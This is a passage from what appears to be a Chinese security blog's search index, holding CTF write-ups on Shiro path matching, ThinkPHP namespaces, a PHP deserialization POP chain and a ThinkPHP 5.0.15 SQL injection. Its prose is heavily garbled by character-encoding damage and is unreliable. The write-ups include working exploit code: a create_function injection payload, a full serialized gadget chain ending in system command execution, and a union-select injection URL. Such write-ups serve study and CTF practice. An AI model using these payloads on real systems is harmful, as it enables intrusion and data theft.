¼æ¨¡å¼ï¼Œantè·¯å¾„é€šè¿‡é€šé…ç¬¦æ”¯æŒâ€?â€ã€â€â€œã€â€\\*â€œã€‚å¯¹äºâ€?â€ï¼Œå…¶åŒ¹é…ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚å¦‚â€/admin?â€å°†åŒ¹é…â€/admin1â€ã€ä½†ä¸åŒ¹é…â€/adminâ€æˆ–è€…â€/admin/â€œ å¯¹äºâ€â€œ,å…¶åŒ¹é…/admin/abcâ€ï¼Œä½†ä¸åŒ¹é…/admin/a/bå¯¹äºâ€\\*â€œï¼Œå…¶åŒ¹é…è·¯å¾„ä¸­çš„é›¶ä¸ªæˆ–å¤šä¸ªè·¯å¾„ï¼Œå¦‚â€œ/admin/**â€å°†åŒ¹é…â€œ/admin/aâ€æˆ–â€œ/admin/a/bâ€ã€‚ å¸¸ç”¨çš„æ‹¦æˆªå™¨é…ç½®anonæ‹¦æˆªå™¨è¡¨ç¤ºåŒ¿åè®¿é—®authcæ‹¦æˆªå™¨è¡¨ç¤ºéœ€è¦èº«ä»½è®¤è¯è¿‡åæ‰èƒ½è®¿é—®æ‹¦æˆªå™¨çš„åŒ¹é…é¡ºåºé‡‡å–ç¬¬ä¸€æ¬¡åŒ¹é…ä¼˜å…ˆçš„æ–¹å¼ï¼Œå³ä»å¤´å¼€å§‹ç¬¬ä¸€ä¸ªåŒ¹é…çš„urlæ¨¡å¼å¯¹åº”çš„æ‹¦æˆªå™¨é“¾ eg:Map&lt;String, String&gt; map = new LinkedHashMap&lt;&gt;();map.put(&quot;/doLogin&quot;, &quot;anon&quot;);map.put(&quot;/admin/*&quot;, &quot;authc&quot;);map.put(&quot;/manage/*&quot;, &quot;authc&quot;); CVE-2020-1957","link":"/2021/09/24/spring-security/"},{"title":"PHPæ¡†æ¶åŸºç¡€è¯­æ³•å­¦ä¹ ","text":"å‰è¨€åˆšå¥½æœ€è¿‘åšçš„æŒºå¤šæŒ–é“¾å­çš„é¢˜ç›®éƒ½æœ‰æ¶‰åŠå‘½åç©ºé—´çš„çŸ¥è¯†ç‚¹ï¼Œä¹‹å‰éƒ½æ˜¯åœ¨ä¸€ä¸ªphpæ–‡ä»¶ä¸­è¿›è¡Œäº†é“¾å­çš„æŒ–æ˜ï¼Œç°åœ¨åˆ†æ•£åˆ°å¾ˆå¤šæ–‡ä»¶ä¸­ï¼Œè™½ç„¶æœ¬è´¨æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯å¦‚æœæ²¡æœ‰ç†è§£å¥½å‘½åç©ºé—´çš„å«ä¹‰ï¼Œä¸€æ—¶åŠä¼šæƒ³è¦åšå‡ºæ¥ä¹Ÿæ˜¯æœ‰éš¾åº¦çš„ å‘½åç©ºé—´è¦ç†è§£å¥½å‘½åç©ºé—´çš„è¯å¯ä»¥å’Œç›®å½•åšä¸€ä¸ªç±»æ¯”ï¼Œæ¯”å¦‚è¯´æœ‰ä¸€ä¸ªç›®å½•ä¸º/homeä»–ä¸‹é¢æœ‰ä¸€ä¸ªfoo.txtï¼Œé‚£ä¹ˆå¯¹äºè¿™ä¸ªfoo.txtæ¥è¯´ï¼Œè¿™ä¸ªhomeå°±æ˜¯ä¸€ä¸ªå‘½åç©ºé—´ï¼Œ å‘½åç©ºé—´çš„å£°æ˜å¯é¿å…ç±»æˆ–å‡½æ•°åé‡å¤å¯¼è‡´çš„å„ç§é—®é¢˜ã€‚ä½¿ç”¨namespaceå¯ä»¥å£°æ˜ã€åˆ‡æ¢å‘½åç©ºé—´ã€‚ åœ¨ç¨‹åºå½“ä¸­ï¼Œå…¶ä½œç”¨æ˜¯æŒ‰ç…§ä¸€ç§è™šæ‹Ÿçš„å±‚æ¬¡ç»“æ„ç»„ç»‡ PHP ä»£ç ï¼Œè¿™ç§å±‚æ¬¡ç»“æ„ç±»ä¼¼æ“ä½œç³»ç»Ÿä¸­æ–‡ä»¶ç³»ç»Ÿçš„ç›®å½•ç»“æ„ã€‚ ç›´æ¥ä¸¾ä¸ªæ —å­ï¼šä¸€ä¸ªå…¸å‹çš„æ§åˆ¶å™¨ç±»å®šä¹‰å¦‚ä¸‹ï¼š namespace app\\index\\controller;class Index { public function index() { return 'index'; }} æ§åˆ¶å™¨ç±»æ–‡ä»¶çš„å®é™…ä½ç½®æ˜¯ application\\index\\controller\\Index.php å½“æ§åˆ¶å™¨çš„å®šä¹‰ä¸º: namespace app\\index\\controller;class Index { public function hello() { return 'hello,world!'; } public function data() { return ['name'=&gt;'thinkphp','status'=&gt;1]; }} é‚£ä¹ˆæƒ³è¦è®¿é—®ä¸åŒçš„è·¯ç”±å°±è¦: http://localhost/index.php/index/Index/hellohttp://localhost/index.php/index/Index/data å›æ¥çœ‹ä¸€ä¸‹æºç è¦è®¿é—®ä¸‹é¢çš„å†…å®¹çš„è·¯ç”±å°±ä¸º /index.php/index/index/backdoor ä»€ä¹ˆæ˜¯æ§åˆ¶å™¨ï¼Ÿæ§åˆ¶å™¨å°±æ˜¯MVCè®¾è®¡æ¨¡å¼ä¸­çš„Cï¼ˆControllerï¼‰ï¼Œé€šå¸¸ç”¨äºè¯»å–è§†å›¾Vï¼ˆViewï¼‰ã€å®Œæˆç”¨æˆ·è¾“å…¥ä»¥åŠå¤„ç†æ¨¡å‹æ•°æ®Mï¼ˆModelï¼‰ã€‚ æŒ‰ç…§ThinkPHPçš„æ¶æ„è®¾è®¡ï¼Œæ‰€æœ‰çš„URLè¯·æ±‚ï¼ˆæ— è®ºæ˜¯å¦é‡‡ç”¨äº†è·¯ç”±ï¼‰ï¼Œæœ€ç»ˆéƒ½ä¼šå®šä½åˆ°æ§åˆ¶å™¨ï¼ˆä¹Ÿè®¸å®é™…çš„ç±»ä¸ä¸€å®šæ˜¯æ§åˆ¶å™¨ç±»ï¼Œä½†ä¹Ÿå±äºå¹¿ä¹‰èŒƒç•´çš„æ§åˆ¶å™¨ï¼‰ã€‚æ§åˆ¶å™¨çš„å±‚å¯èƒ½æœ‰å¾ˆå¤šï¼Œä¸ºäº†ä¾¿äºåŒºåˆ†å°±æŠŠé€šè¿‡URLè®¿é—®çš„æ§åˆ¶å™¨ç§°ä¹‹ä¸ºè®¿é—®æ§åˆ¶å™¨ï¼ˆé€šå¸¸æ„ä¹‰ä¸Šæˆ‘ä»¬æ‰€è¯´çš„æ§åˆ¶å™¨å°±æ˜¯æŒ‡è®¿é—®æ§åˆ¶å™¨ï¼‰ã€‚ ä¾‹å¦‚æˆ‘ä»¬è®¿é—®ä¸€ä¸ªURLåœ°å€ï¼š http://tp5.com/index/index/hello å®é™…ä¸Šè®¿é—®çš„æ˜¯indexæ¨¡å—ä¸‹çš„Indexæ§åˆ¶å™¨ç±»çš„helloæ–¹æ³•ï¼ˆåœ¨æ²¡æœ‰å®šä¹‰ä»»ä½•è·¯ç”±çš„æƒ…å†µä¸‹ï¼‰ï¼ŒIndexæ§åˆ¶å™¨å¯¹åº”çš„ç±»å°±æ˜¯app\\index\\controller\\Indexï¼ˆä¸ºä»€ä¹ˆæ§åˆ¶å™¨ç±»åéœ€è¦è¿™æ ·å‘½ååé¢å‘½åç©ºé—´éƒ¨åˆ†ä¼šè¯¦ç»†æè¿°ï¼‰ï¼Œå®Œæˆä¸Šé¢çš„URLè®¿é—®ï¼Œåªéœ€è¦å®šä¹‰å¦‚ä¸‹çš„æ§åˆ¶å™¨ç±»ï¼Œçœ‹èµ·æ¥éå¸¸ç®€å•ï¼š ä»€ä¹ˆæ˜¯å‘½åç©ºé—´ç°åœ¨æ¥åˆ†æä¸‹æ§åˆ¶å™¨çš„ç±»åä¸ºä»€ä¹ˆæ˜¯app\\index\\controller\\Indexè€Œä¸æ˜¯Indexï¼Œé¦–å…ˆå°±æ˜¯è¦æ˜ç™½å‘½åç©ºé—´çš„æ¦‚å¿µã€‚PHPä»5.3ç‰ˆæœ¬å¼€å§‹å¼•å…¥å‘½åç©ºé—´çš„æ¦‚å¿µï¼Œå…¶ä¸»è¦ä½œç”¨æ˜¯ç¡®ä¿ç±»åä¸ä¼šå†²çªï¼Œå› ä¸ºåœ¨ä¸€ä¸ªåº”ç”¨ä¸­ï¼Œå‡ºç°ç›¸åŒçš„ç±»åçš„å‡ ç‡éå¸¸ä¹‹å¤§ï¼Œå¹¶ä¸”ä½ å¾ˆéš¾ä¿è¯å¼•å…¥çš„ç¬¬ä¸‰æ–¹ç±»åº“ä¸å†²çªï¼Œè€Œæœ‰äº†å‘½åç©ºé—´åï¼Œç›¸å½“äºç»™è‡ªå·±çš„ç±»åŠ äº†ä¸€ä¸ªé—¨ç‰Œå·ä¸€æ ·ï¼Œä¸€ä¸ªç±»çš„ç»„æˆåŒ…æ‹¬ï¼š ç±»çš„ç»„æˆ = æ ¹å‘½åç©ºé—´+å­å‘½åç©ºé—´ï¼ˆå¯é€‰ï¼‰+ç±»å app\\index\\controller\\Indexï¼Œè¿™æ˜¯ThinkPHPæ¡†æ¶åˆ¶å®šçš„è§„èŒƒï¼Œappæ˜¯åº”ç”¨ç±»åº“çš„æ ¹å‘½åç©ºé—´ï¼Œä¹Ÿå°±æ˜¯æ‰€æœ‰çš„åº”ç”¨ç±»åº“éƒ½åº”è¯¥ç”¨appä½œä¸ºæ ¹å‘½åç©ºé—´å®šä¹‰ã€‚indexæ˜¯è¡¨ç¤ºæ¨¡å—ç›®å½•ï¼Œcontrollerè¡¨ç¤ºçš„æ˜¯æ§åˆ¶å™¨ï¼ˆç¡®åˆ‡çš„è¯´æ˜¯è®¿é—®æ§åˆ¶å™¨ï¼‰ç›®å½•ï¼ŒIndexæ˜¯å®é™…çš„æ§åˆ¶å™¨ç±»åï¼Œæ‰€ä»¥è¦è¡¨ç¤ºindexæ¨¡å—çš„Indexæ§åˆ¶å™¨ç±»ï¼Œä½¿ç”¨çš„å°±æ˜¯app\\index\\controller\\Indexï¼Œå¦‚æœæ˜¯adminæ¨¡å—çš„Indexæ§åˆ¶å™¨ç±»ï¼Œä½¿ç”¨çš„å°±æ˜¯app\\admin\\controller\\Indexç±»ï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯å•ä¸€æ¨¡å—çš„è¯ï¼Œé‚£ä¹ˆIndexæ§åˆ¶å™¨ç±»å°±å˜æˆäº†app\\controller\\Index æ§åˆ¶å™¨ç»§æ‰¿å‰é¢æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„ä¾‹å­ï¼Œæ²¡æœ‰ç»§æ‰¿ä»»ä½•çš„ç±»ï¼ˆè¿™æ ·å¹¶æ²¡æœ‰ä»»ä½•ä¸å¯¹ï¼Œ5.0çš„æ§åˆ¶å™¨è®¾è®¡å¦‚æ­¤ï¼Œäº‹å®ä¸Šä¹Ÿéå¸¸é«˜æ•ˆï¼‰ï¼Œæ§åˆ¶å™¨å¯ä»¥ç»§æ‰¿ç³»ç»Ÿå†…ç½®çš„æ§åˆ¶å™¨åŸºç±»think\\Controlleræˆ–è€…åº”ç”¨è‡ªå·±çš„æ§åˆ¶å™¨åŸºç±»ï¼Œæ¥æ‰©å±•æ›´å¤šçš„åŠŸèƒ½å’Œæ–¹æ³•ã€‚ ç»§æ‰¿ç³»ç»Ÿæ§åˆ¶å™¨åŸºç±»ï¼š &lt;?phpnamespace app\\index\\controller;use think\\Controller;class Index extends Controller{ public function hello() { return 'hello,world'; }}","link":"/2021/09/26/PHP%E6%A1%86%E6%9E%B6%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/"},{"title":"2021å®‰æ’9æœˆèµ›","text":"å‰è¨€æˆ˜é˜Ÿçš„ç¥ä»™å¤§ä½¬ä»¬éƒ½åœ¨æ‰“TCTFï¼Œæˆ‘çœ‹ä¸æ‡‚é¢˜ç›®ä½†æˆ‘å¤§ä¸ºéœ‡æ’¼ï¼Œè€Œæˆ‘è¿˜åœ¨æ‰“å®‰æ’æœˆèµ›ï¼Œè¿™å¤§æ¦‚å°±æ˜¯ä¸–ç•Œçš„å‚å·®å§ã€‚ã€‚ã€‚ã€‚ hellounseræ‹¿äº†ä¸€ä¸ªä¸€è¡€ï¼Œå¯èƒ½æ˜¯é¢˜ç›®æ¯”è¾ƒç®€å•å§ &lt;?phpclass A { public $var; public function show(){ echo $this-&gt;var; } public function __invoke(){ $this-&gt;show(); }}class B{ public $func; public $arg; public function show(){ $func = $this-&gt;func; if(preg_match('/^[a-z0-9]*$/isD', $this-&gt;func) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i', $this-&gt;arg)) { die('No!No!No!'); } else { include &quot;flag.php&quot;; //There is no code to print flag in flag.php $func('', $this-&gt;arg); } } public function __toString(){ $this-&gt;show(); return &quot;&lt;br&gt;&quot;.&quot;Nice Job!!&quot;.&quot;&lt;br&gt;&quot;; }}$a=new A();$b=new B();$b-&gt;func=&quot;create_function&quot;;$b-&gt;arg=&quot;}require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//&quot;;$a-&gt;var=$b;echo serialize($a);?&gt; xxcå‘ç°è‡ªå·±åœ¨æŒ–æ˜è¿™ç§æ¡†æ¶ä¸‹çš„é“¾å­çš„æ—¶å€™å¾ˆä¸ç†Ÿç»ƒï¼Œä¸»è¦æ˜¯ä¸ä¼šä¹¦å†™å‘½åç©ºé—´çš„è¯­æ³•é¦–å…ˆæ˜¯ç¡®å®šèµ·ç‚¹â€”â€”&gt;å¯»æ‰¾destructé­”æœ¯æ–¹æ³•ï¼Œå…¶ä¸­$processå¯æ§ï¼Œå¹¶ä¸”æŒ‡å‘ä¸€ä¸ªå‡½æ•°ï¼Œå¯»æ‰¾__callçœ‹çœ‹æœ‰æ²¡æœ‰_callæ–¹æ³• namespace Control\\State;class StopHook { protected $output; protected $config = ['auto' =&gt; 0]; protected static $states = ['started', 'running', 'finished', 'waiting', 'fail']; protected $processes; public function __destruct() { $this-&gt;_exit(); } private function _exit() { foreach(array_reverse($this-&gt;processes) as $process) { if (!$process-&gt;isRunning) { continue; } $process-&gt;stop(); } }} åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸‹æœ‰callæ–¹æ³•ï¼Œè®©å…¶è·³è½¬è‡³æ­¤ï¼Œå‘ç°ä¸€ä¸ªechoï¼Œçœ‹çœ‹æ˜¯å¦æœ‰__tostringæ–¹æ³• &lt;?phpnamespace Faker;class MyGenerator { protected $defaultValue; public function __call($method, $arg_array) { echo $this-&gt;defaultCall; return $this-&gt;defaultCall; } public function __get($property) { return $this-&gt;defaultValue; }} åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸‹å¯ä»¥å‘ç°ä¸€ä¸ªtostringï¼Œè·Ÿè¿›ä»¥åï¼Œå‘ç°å…¶å­˜åœ¨ä¸€ä¸ªissetï¼Œé‚£ä¹ˆå°±åªéœ€è¦å¯»æ‰¾__isseté­”æœ¯æ–¹æ³•ï¼Œçœ‹çœ‹æ˜¯å¦èƒ½ç»§ç»­è·³è½¬ &lt;?phpnamespace Method\\Func;class GetFile { private $flag = true; private $files = []; public function __toString() { return $this-&gt;getFiles(); } public function getFiles() { if (!$this-&gt;flag) return &quot;denied&quot;; $s = &quot;&quot;; if (isset($this-&gt;flag-&gt;{$this-&gt;value})) { return &quot;test&quot;; } foreach ($this-&gt;files as $file) { $s += $file-&gt;read(); } return $s; }} åœ¨è¿™é‡Œä¼šå›æ¥æ‰§è¡Œpopupï¼Œå¹¶ä¸”å­˜åœ¨ä¸€ä¸ª$s($length)ï¼Œç±»ä¼¼äºè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆå¦‚æœå°†è¿™ä¸ªå‡½æ•°è°ƒç”¨æ–¹å¼æ”¹ä¸ºå¯¹è±¡ï¼Œå³å¯è§¦å‘__invokeæ–¹æ³• &lt;?phpnamespace Method\\Func;class GetDefault { private $source; public function popup($length) { $s = $this-&gt;source; if ($s-&gt;flag != &quot;myTest&quot;) { return &quot;denied&quot;; } return $s($length); } public function __isset($property) { if ($property != &quot;test&quot;) { return false; } return !$this-&gt;popup(666); }} åºåˆ—åŒ–ç»ˆç‚¹å°±åœ¨è¿™é‡Œï¼Œè°ƒç”¨è¿™ä¸ªcall_user_funcå®ç°å‘½ä»¤æ‰§è¡Œ &lt;?phpnamespace Method\\Func;class GenerateFile { public $flag; protected $buffer; public function __invoke($param) { $this-&gt;myGen($param); } public function myGen($length) { $s = $this-&gt;buffer-&gt;read; call_user_func($this-&gt;source-&gt;generate, $length); return $s; }} é‚£ä¹ˆæœ€ç»ˆæ„é€ çš„é“¾æ¡å¦‚ä¸‹ï¼š &lt;?phpnamespace Control\\State;use Faker\\MyGenerator;{ class StopHook { protected $output; protected $config = ['auto' =&gt; 0]; protected static $states = ['started', 'running', 'finished', 'waiting', 'fail']; protected $processes; public function __construct() { $this-&gt;processes=array(new MyGenerator()); } public function __destruct() { $this-&gt;_exit(); } private function _exit() { foreach (array_reverse($this-&gt;processes) as $process) { if (!$process-&gt;isRunning) { continue; } $process-&gt;stop(); } } } include(&quot;D:\\apache\\www\\å®‰æ’æœˆèµ›\\www\\closure/autoload.php&quot;);#è¿™è¾¹ä¼¼ä¹ä¸å½±å“ï¼Œæˆ‘åœ¨æœ¬åœ°éœ€è¦è°ƒç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯é¢˜ç›®å·²ç»è‡ªåŠ¨ç»™ä½ åŒ…å«äº†ï¼Œæ‰€ä»¥é—®é¢˜ä¸å¤§ $a=new StopHook(); echo base64_encode(serialize($a));}namespace Faker;use Method\\Func\\GetFile;{ class MyGenerator { protected $defaultValue; public function __construct()#æ„å»ºå¯¹è±¡æ—¶è¢«è°ƒç”¨ { $this-&gt;defaultValue = new GetFile(); } public function __call($method, $arg_array) { echo $this-&gt;defaultCall; return $this-&gt;defaultCall; } public function __get($property) { return $this-&gt;defaultValue; } }}namespace Method\\Func;{ class GetFile { private $flag = true; private $files = []; public function __construct() { $this-&gt;flag = new GetDefault(); $this-&gt;value = &quot;test&quot;; } public function __toString() { return $this-&gt;getFiles(); } public function getFiles() { if (!$this-&gt;flag) return &quot;denied&quot;; $s = &quot;&quot;; if (isset($this-&gt;flag-&gt;{$this-&gt;value})) { return &quot;test&quot;; } foreach ($this-&gt;files as $file) { $s += $file-&gt;read(); } return $s; } } class GetDefault { private $source; public function __construct() { $this-&gt;source = new GenerateFile(); $this-&gt;source-&gt;flag = &quot;myTest&quot;; } public function popup($length) { $s = $this-&gt;source; if ($s-&gt;flag != &quot;myTest&quot;) { return &quot;denied&quot;; } return $s($length); } public function __isset($property) { if ($property != &quot;test&quot;) { return false; } return !$this-&gt;popup(666); } } class GenerateFile { public $flag; protected $buffer; public $source; public function __construct() { $function = function () { system(&quot;ls&quot;); }; $a = \\Opis\\Closure\\serialize($function); $b = unserialize($a); $this-&gt;source-&gt;generate = $b; } public function __invoke($param) { $this-&gt;myGen($param); } public function myGen($length) { $s = $this-&gt;buffer-&gt;read; call_user_func($this-&gt;source-&gt;generate, $length); return $s; } } } å…¶ä¸­éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œåœ¨æ¯æ¬¡è°ƒç”¨é“¾çš„æ—¶å€™éƒ½è¦å…ˆå£°æ˜ä¸€ä¸‹æ‰€åœ¨çš„å‘½åç©ºé—´ï¼Œå¹¶ä¸”ï¼Œå¦‚æœéœ€è¦è°ƒç”¨åˆ°å…¶ä»–å‘½åç©ºé—´çš„å†…å®¹çš„æ—¶å€™ï¼Œéœ€è¦ä½¿ç”¨use,ä¸¾ä¸ªä¾‹å­use Method\\Func\\GetFile;ä¸ç„¶å°±ä¼šæŠ¥é”™ æœ‰ç‚¹å¯æƒœçš„æ˜¯ï¼Œæ¯”èµ›çš„æ—¶å€™å·²ç»æ„é€ å‡ºé“¾å­äº†ï¼Œä½†æ˜¯å½“æ—¶æ²¡å­¦å¥½å‘½åç©ºé—´çš„åŸºæœ¬ç”¨æ³•ï¼Œæ‰€ä»¥å°±ä¸€ç›´æ‰“ä¸é€šå“~","link":"/2021/09/25/2021%E5%AE%89%E6%81%929%E6%9C%88%E8%B5%9B/"},{"title":"2021å¤©ç¿¼æ¯(thinkphp5.0.15sqlæ³¨å…¥æ¼æ´+)","text":"å‰è¨€:ä¸»è¦æ˜¯æƒ³ç»ƒä¹ ä¸€ä¸‹å¦‚ä½•åœ¨æ¡†æ¶ä¸‹æŒ–æ¼æ´ ç¯å¢ƒæ­å»ºé€šè¿‡ä»¥ä¸‹å‘½ä»¤è·å–æµ‹è¯•ç¯å¢ƒä»£ç ï¼š composer create-project --prefer-dist topthink/think=5.0.15 tpdemo å°† composer.json æ–‡ä»¶çš„ require å­—æ®µè®¾ç½®æˆå¦‚ä¸‹ï¼š &quot;require&quot;: { &quot;php&quot;: &quot;&gt;=5.4.0&quot;, &quot;topthink/framework&quot;: &quot;5.0.15&quot;} ç„¶åæ‰§è¡Œ composer update ï¼Œå¹¶å°† application/index/controller/Index.php æ–‡ä»¶ä»£ç è®¾ç½®å¦‚ä¸‹ï¼š &lt;?phpnamespace app\\index\\controller;class Index{ public function index() { $username = request()-&gt;get('username/a'); db('users')-&gt;insert(['username' =&gt; $username]); return 'Update success'; }} åœ¨ application/database.php æ–‡ä»¶ä¸­é…ç½®æ•°æ®åº“ç›¸å…³ä¿¡æ¯ï¼Œå¹¶å¼€å¯ application/config.php ä¸­çš„ app_debug å’Œ app_trace ã€‚åˆ›å»ºæ•°æ®åº“ä¿¡æ¯å¦‚ä¸‹ï¼š create database tpdemo;use tpdemo;create table users( id int primary key auto_increment, username varchar(50) not null); æ¼æ´å¤ç°insert()æ³¨å…¥å¤ç°è¿™é‡Œç›´æ¥å°±å»è°ƒç”¨insertå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ç›´æ¥æŠŠæ–­ç‚¹ä¸‹åœ¨è¿™é‡Œï¼Œå¾€ä¸‹çœ‹æ•°æ®çš„å˜åŒ–æ•°æ®ä»¥æ•°ç»„çš„å½¢å¼è¢«ä¼ å…¥parsedataè¿›è¡Œæ•°æ®è§£æ åœ¨æ­¤å¤„ç›´æ¥å¯¹è¾“å…¥çš„æ•°ç»„æ•°æ®å…ˆè¿›è¡Œé€‰æ‹©ï¼Œåç›´æ¥è¿›è¡Œæ‹¼æ¥ å¹¶ä¸”ç›´æ¥å¯¹ç»“æœè¿›è¡Œäº†ä¸€ä¸ªè¿”å›åç»­ç›´æ¥å°†è¯¥è¾“å…¥æ‹¼æ¥åœ¨insertè¯­å¥çš„ååŠæ®µé€ æˆæŠ¥é”™æ³¨å…¥: select()æ³¨å…¥å¤ç°æ–­ç‚¹æˆ‘ç›´æ¥æ­è½½å‰é¢getè¿™é‡Œï¼Œç„¶åçœ‹ä»–ä¸€ä¸ªå€¼çš„ä¼ å…¥ é¦–å…ˆä»æˆ‘ä»¬ä¼ å…¥çš„æ•°ç»„ä¸­å–å€¼ï¼Œå¹¶ä¸”å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªå‡½æ•°ä¼šé€’å½’åˆ°æ›´æ·±å±‚æ¬¡çš„æ•°ç»„ä¸­æ¥ä¸‹æ¥ä¼šè¿›å…¥ä¸€ä¸ªè¿‡æ»¤ï¼Œå¾ˆå¥‡æ€ªçš„æ˜¯ï¼Œåœ¨åˆ«äººå¤ç°çš„æºç é‡Œï¼Œnotlikeæ˜¯åˆèµ·æ¥å†™çš„ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬åœ¨è¿™é‡Œå†™not likeçš„æ—¶å€™ï¼Œå°±å¯ä»¥ç»•è¿‡ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿™é‡Œçš„æºç ä¸¤ä¸ªéƒ½æœ‰è¿‡æ»¤åé¢ç»§ç»­ç»è¿‡ä¸€ç³»åˆ—æ‹¼æ¥èµ‹å€¼æ“ä½œï¼Œå…¶ä¸­selectå‡½æ•°ä¸­ï¼Œwhereå†…å®¹æ˜¯å¯æ§çš„ æœ‰éš¾åº¦åº”è¯¥å°±æ˜¯è¿™æ®µæ•°ç»„ç»“æœè¿›è¡Œè½¬åŒ–æ‹¼æ¥çš„ï¼Œè¿™é‡Œä»‹ç»ä¸€ä¸‹ï¼Œæˆ‘ä»¬ä¼ å…¥çš„äº†ä¸€ä¸ªusername[0]é‚£ä¹ˆä»–å°±ä¼šè¢«æ‹¼æ¥åœ¨æœ€å‰é¢ï¼Œæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å†ä¼ å…¥ä¸€ä¸ªusername[1][1\\]=%å’Œusername\\[1\\]\\[2\\]=aaaé‚£ä¹ˆä»–ä¼šè¢«åˆ†åˆ«æ‹¼æ¥åˆ°ä¸¤ä¸ª`username`åæ‰€æ¥å…¥çš„å†…å®¹å‘¢ï¼Œä¹Ÿå°±æ˜¯username not like '%' ç„¶åusername not like aaa ç´§æ¥ç€å¦‚æœæˆ‘ä»¬æœ‰username\\[2\\]çš„è¯ï¼Œé‚£ä¹ˆè¿™ä¸ªä¹Ÿå°±ä¼šè¢«ç›´æ¥è¢«å…ˆæ‹¼æ¥åˆ°username\\[1\\]\\[1\\]çš„åé¢ wherestrçš„å†…å®¹å°†è¢«æ‹¼æ¥ä¸ºä»¥ä¸‹å†…å®¹ï¼Œé€šè¿‡$arrayçš„å€¼è¿›è¡Œåˆ†å‰²åï¼Œå†åŠ ä¸Šä¸€ä¸ªæ‹¬å· eg:array[1]=abc;array[2]=bcd;login=123;(abc 123 bcd) å¸¦å›åˆ°åŸæŸ¥è¯¢è¯­å¥ï¼Œå¯ä»¥å‘ç°è¿™åœ¨ åœ¨mysqlä¸­æµ‹è¯• payload:?password=2&amp;username[0]=not like&amp;username[1][0]=%25&amp;username[1][1]=aaa&amp;username[2][0]=) union select 1,2,3%23&amp;username[2][1]=123 https://blog.csdn.net/weixin_45669205/article/details/116464224","link":"/2021/09/27/2021%E5%A4%A9%E7%BF%BC%E6%9D%AF/"},{"title":"javascriptå¥‡å¦™çš„å˜é‡ç±»å‹å®‰å…¨é—®é¢˜","text":"å˜é‡ç±»å‹æ±¡æŸ“é—®é¢˜jsæ•°æ®ç±»å‹å€¼ç±»å‹(åŸºæœ¬ç±»å‹): å­—ç¬¦ä¸²ï¼Œæ•°å­—ï¼Œå¸ƒå°”ï¼Œå¯¹ç©ºï¼Œæœªå®šä¹‰ï¼Œsymbol(es6å¼•å…¥ä¸€ç§æ–°çš„åŸå§‹æ•°æ®ç±»å‹ï¼Œè¡¨ç¤ºç‹¬ä¸€æ— äºŒçš„å€¼) å¼•ç”¨æ•°æ®ç±»å‹: å¯¹è±¡(object)ï¼Œæ•°ç»„(array)ï¼Œå‡½æ•°(function) å¯¹è±¡èŠ±æ‹¬å·åˆ†å‰²ï¼Œåœ¨æ‹¬å·å†…éƒ¨ï¼Œå¯¹è±¡çš„å±æ€§ä»¥åç§°å’Œå€¼å¯¹çš„å½¢å¼(name : value)æ¥å®šä¹‰å±æ€§ç”±é€—å·åˆ†å‰²: eg:var person={firstname:&quot;John&quot;,lastname:&quot;Doe&quot;}æ­¤æ—¶å¯¹è±¡personæœ‰ä¸‰ä¸ªå±æ€§ï¼Œfirstname,lastname å¯¹è±¡å±æ€§å¯»å€æ–¹å¼ name=person.lastname;name=person[&quot;lastname&quot;]; jsonå¯ä»¥å‘é€çš„æ•°æ®JSON å€¼å¯ä»¥æ˜¯ï¼š æ•°å­—ï¼ˆæ•´æ•°æˆ–æµ®ç‚¹æ•°ï¼‰ å‘é€1 #typeof number å­—ç¬¦ä¸²ï¼ˆåœ¨åŒå¼•å·ä¸­ï¼‰ å‘é€&quot;a&quot;#typeof string é€»è¾‘å€¼ï¼ˆtrue æˆ– falseï¼‰ å‘é€true#typeof boolean æ•°ç»„ï¼ˆåœ¨ä¸­æ‹¬å·ä¸­ï¼‰ å‘é€[&quot;a&quot;,&quot;b&quot;]#typeof object å¯¹è±¡ï¼ˆåœ¨å¤§æ‹¬å·ä¸­ï¼‰ å‘é€{&quot;name&quot;: &quot;Tom&quot;,&quot;Grade&quot;:1, &quot;age&quot;:11, &quot;gender&quot;: &quot;M&quot;} #typeof object null å‘é€null#typeof object åŠ è¿ç®—å­—ç¬¦ä¸²+å­—ç¬¦ä¸²ä¾ç„¶å¾—åˆ°å­—ç¬¦ä¸²å­—ç¬¦ä¸²+æ•°ç»„ä¹Ÿæ˜¯ï¼Œå…¶ä»–éƒ½æ˜¯ä½†å¦‚æœä¸æ˜¯å­—ç¬¦ä¸²ç›¸åŠ ï¼Œåˆ™ä¸ºtrue+true=2#å› ä¸ºtrueä¸º1åŸºæœ¬ä¸Šé™¤äº†Number+Number=Numberï¼ŒBool+Bool=Number 